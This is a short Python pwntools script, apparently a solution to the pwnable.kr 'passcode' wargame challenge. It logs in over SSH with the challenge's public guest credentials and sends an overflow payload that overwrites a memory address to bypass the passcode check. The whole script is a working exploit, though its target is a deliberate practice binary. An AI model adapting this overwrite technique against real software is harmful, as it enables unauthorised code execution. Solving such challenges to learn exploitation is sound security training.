from pwn import *
pwn_ssh=ssh(host='pwnable.kr',user='passcode',password='guest',port=2222)
print (pwn_ssh.connected())
sh=pwn_ssh.process(executable="./passcode")
print (sh.recv())
sh.sendline('A'*96+'\x04\xa0\x04\x08'+'134514135')
print (sh.recvall())

